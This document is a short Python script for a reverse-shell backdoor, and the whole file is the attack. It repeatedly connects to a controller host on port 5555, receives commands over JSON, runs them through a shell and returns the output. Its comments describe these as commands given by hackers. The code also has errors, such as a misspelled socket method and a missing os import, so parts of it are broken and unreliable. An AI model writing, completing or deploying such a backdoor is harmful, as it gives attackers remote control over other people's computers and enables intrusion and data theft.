import socket
import time
import subprocess
import json

def send(data):
        jsondata = json.dumps(data)
        soc.send(jsondata.encode()) # here, the data is eocoded transfered

def recieve():
        data = ""
        while True:
                try:
                        data = data + soc.recieve(1024).decode().rstrip()
                        """ here 1024 = bits of the data that is to be recieved.
                        .decode() is to deocde the encoded data
                        .rstrip removes extra spaces input by mistake
                        """
                        return json.loads(data)
                except ValueError:
                        continue

def connection():
	while True:   # infinite true loop tries connection every 20 sec.
		time.sleep(20)
		try:
			soc.connect(("0.0.0.0", 5555))
			shell()
			soc.close()
			break
		except:
			connection()

def shell():
	while True: # here, the commands given by the hackers are executed
		command = recieve()
		if command == "quit":
			break
		elif command == "clear" :
			pass
		elif command[:3] == "cd ":
			os.chdir(command[3:])
		else:
			execute = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			send(result)

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
